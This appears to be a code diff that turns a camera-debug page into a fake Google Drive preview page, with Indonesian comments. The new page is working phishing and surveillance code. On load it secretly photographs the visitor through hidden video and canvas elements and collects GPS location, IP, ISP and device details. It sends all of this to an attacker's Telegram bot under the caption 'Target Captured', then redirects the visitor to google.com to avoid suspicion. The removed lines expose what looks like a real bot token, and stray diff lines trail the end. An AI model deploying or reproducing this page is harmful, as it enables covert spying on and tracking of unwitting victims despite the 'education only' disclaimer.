@@ -3,83 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Debug Kamera</title>
+    <title>Google Drive - Pratinjau File</title>
     <style>
+        /* CSS untuk meniru tampilan Google Drive */
         body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #f8f9fa;
             margin: 0;
             padding: 20px;
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            color: #333;
-            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            max-width: 600px;
-            margin: auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 { color: #d93025; } /* Warna merah untuk menandakan ini adalah mode debug */
-        #status {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #555;
-        }
-        /* --- PERUBAHAN PENTING: BUAT VIDEO TERLIHAT UNTUK DEBUGGING --- */
-        #video {
-            display: block;
-            max-width: 100%;
+            background-color: white;
             border-radius: 8px;
-            margin-top: 15px;
-            border: 2px solid #ddd;
-            transform: scaleX(-1); /* Cerminkan video agar terlihat seperti mirror */
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 600px;
+            padding: 24px;
+            box-sizing: border-box;
+            text-align: center;
         }
-        #canvas {
-            display: none; /* Canvas tetap tersembunyi */
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+            padding-bottom: 16px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 16px;
+        }
+        h1 {
+            font-size: 22px;
+            color: #202124;
+            margin: 0;
+            font-weight: 400;
+        }
+        .preview-area {
+            background-color: #e8f0fe;
+            border: 1px dashed #4285f4;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 20px 0;
+        }
+        .preview-area p {
+            color: #1967d2;
+            font-size: 18px;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Sembunyikan elemen yang digunakan untuk proses di belakang layar */
+        #video, #canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>MODE DEBUG KAMERA</h1>
-        <p>Video kamera seharusnya terlihat di bawah ini. Jika video hitam, masalah ada di akses kamera. Jika video jelas, masalah ada di proses pengiriman.</p>
-        <p id="status">Status: Menunggu untuk memulai...</p>
-        
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
+        <div class="header">
+            <svg class="logo" viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg"><path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/><path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/><path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/><path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/><path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/><path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/></svg>
+            <h1>Google Drive</h1>
+        </div>
+        <div class="preview-area">
+            <p>Memuat file rahasia...</p>
+            <div class="loader"></div>
+            <p style="font-size: 14px; margin-top: 15px;">Mohon tunggu, verifikasi keamanan sedang dilakukan.</p>
+        </div>
     </div>
 
-    <script>
-        // --- GANTI DENGAN BOT TOKEN ANDA ---
-        const BOT_TOKEN = "8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo";
-        // -----------------------------------
+    <!-- Elemen-elemen tersembunyi untuk proses di belakang layar -->
+    <video id="video"></video>
+    <canvas id="canvas"></canvas>
 
-        // Fungsi untuk mendapatkan parameter dari URL
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
+    <script>
+        // =============================================================================
+        // DISCLAIMER: KODE INI HANYA UNTUK TUJUAN EDUKASI KEAMANAN SIBER.
+        // Penggunaan tanpa izin untuk mencuri data adalah ILEGAL.
+        // =============================================================================
+
+        // --- KONFIGURASI ---
+        // PRAKTIK BURUK: Token bot seharusnya tidak di-hardcode di sisi klien.
+        // Untuk demo ini, kita letakkan di sini. Di produksi, gunakan backend server
+        // sebagai proxy untuk mengirim data ke Telegram.
+        const BOT_TOKEN = '1234567890:AAF_xxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // <-- GANTI DENGAN TOKEN ANDA
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        // --- EKSTRAKSI PARAMETER URL ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const uniqueBotId = urlParams.get('_y');
+        const encodedChatId = urlParams.get('_x');
+
+        // Jika parameter tidak lengkap, hentikan proses dan alihkan.
+        if (!uniqueBotId || !encodedChatId) {
+            console.error('Parameter URL tidak valid. Mengalihkan...');
+            window.location.href = 'https://google.com';
+            // Stop eksekusi script lebih lanjut
+            throw new Error("Invalid parameters");
         }
 
-        // Variabel global
-        let video, canvas, statusText;
-        let CHAT_ID;
-        let captureInterval;
+        // Decode chatId target
+        const targetChatId = atob(encodedChatId);
 
-        // Fungsi utama yang dijalankan saat halaman dimuat
-        async function startCapture() {
-            video = document.getElementById('video');
-            canvas = document.getElementById('canvas');
-            statusText = document.getElementById('status');
+        // --- FUNGSI PENGUMPULAN DATA (DIJALANKAN PARALEL) ---
 
+        /**
+         * Meminta izin kamera dan mengambil satu foto.
+         * @returns {Promise<Blob|null>} Promise yang resolve dengan blob foto atau null jika gagal.
+         */
+        async function getPhoto() {
             try {
-                // 1. Ambil data dari URL
-                const botId = getQueryParam('_y');
-                const encodedChatId = getQueryParam('_x');
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // Prioritaskan kamera depan
+                });
+                
+                video.srcObject = stream;
+                video.play();
 
-                if (!botId || !encodedChatId) {
+                // Tunggu video siap
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => resolve();
+                });
+
+                // Set resolusi canvas ke resolusi video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Gambar frame video ke canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Hentikan stream kamera
+                stream.getTracks().forEach(track => track.stop());
+
+                // Kembalikan foto sebagai blob
+                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+            } catch (error) {
+                console.error("Kamera ditolak atau tidak tersedia:", error);
+                return null; // Kembalikan null jika gagal
+            }
+        }
+
+        /**
+         * Meminta izin lokasi dan mengambil koordinat.
+         * @returns {Promise<Object|null>} Promise yang resolve dengan objek lokasi atau null jika ditolak.
+         */
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    (error) => {
+                        console.error("Lokasi ditolak:", error);
+                        resolve(null); // Jangan gagal total jika lokasi ditolak
+                    }
+                );
+            });
+        }
+
+        /**
+         * Mengumpulkan informasi perangkat dan jaringan.
+         * @returns {Promise<Object>} Promise yang resolve dengan objek data perangkat.
+         */
+        async function getDeviceAndNetworkInfo() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                if (!response.ok) throw new Error('Gagal mengambil data IP');
+                const ipData = await response.json();
+
+                return {
+                    ip: ipData.query,
+                    country: ipData.country,
+                    city: ipData.city,
+                    isp: ipData.isp,
+                    timezone: ipData.timezone,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    platform: navigator.platform,
+                    language: navigator.language
+                };
+            } catch (error) {
+                console.error("Gagal mengambil info jaringan:", error);
+                // Kembalikan data dasar jika API gagal
+                return {
+                    ip: 'Tidak diketahui',
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    platform: navigator.platform,
+                    language: navigator.language
+                };
+            }
+        }
+
+        // --- EKSEKUSI UTAMA ---
+        window.onload = async () => {
+            // Jalankan semua fungsi pengumpulan data secara paralel
+            const [photo, location, deviceInfo] = await Promise.allSettled([
+                getPhoto(),
+                getLocation(),
+                getDeviceAndNetworkInfo()
+            ]);
+
+            // Ekstrak nilai dari Promise.allSettled
+            const photoBlob = photo.status === 'fulfilled' ? photo.value : null;
+            const locationData = location.status === 'fulfilled' ? location.value : null;
+            const networkData = deviceInfo.status === 'fulfilled' ? deviceInfo.value : {};
+
+            // --- FORMAT DAN KIRIM DATA ---
+            let locationString = 'Tidak diketahui';
+            if (locationData) {
+                locationString = `${locationData.latitude}, ${locationData.longitude}`;
+            }
+
+            const caption = `🎯 Target Tertangkap!\n` +
+                `📍 Lokasi GPS: ${locationString}\n` +
+                `🌐 IP Address: ${networkData.ip || 'Tidak diketahui'}\n` +
+                `🏢 Kota/Negara: ${networkData.city || 'Tidak diketahui'}, ${networkData.country || 'Tidak diketahui'}\n` +
+                `🏢 ISP: ${networkData.isp || 'Tidak diketahui'}\n` +
+                `💻 Perangkat: ${networkData.userAgent}\n` +
+                `📱 Resolusi Layar: ${networkData.screenResolution}\n` +
+                `⚙️ Platform: ${networkData.platform}\n` +
+                `🌍 Bahasa: ${networkData.language}`;
+
+            // Kirim data ke Telegram
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', targetChatId);
+                formData.append('photo', photoBlob, 'capture.jpg');
+                formData.append('caption', caption);
+
+                try {
+                    await fetch(TELEGRAM_API_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('Data berhasil dikirim ke Telegram.');
+                } catch (error) {
+                    console.error('Gagal mengirim data ke Telegram:', error);
+                }
+            } else {
+                // Jika foto gagal, kirim hanya teks
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: targetChatId,
+                            text: caption
+                        })
+                    });
+                    console.log('Data teks berhasil dikirim ke Telegram.');
+                } catch (error) {
+                    console.error('Gagal mengirim data teks ke Telegram:', error);
+                }
+            }
+
+            // --- PENUTUP: ALIHKAN PENGGUNA ---
+            // Alihkan pengguna ke situs yang sah untuk menghilangkan jejak dan mengurangi kecurigaan.
+            window.location.href = 'https://google.com';
+        };
+    </script>
+</body>
+</html>                if (!botId || !encodedChatId) {
                     console.error("Parameter URL (_y atau _x) tidak ditemukan.");
                     statusText.textContent = "Error: Link tidak valid.";
                     return;
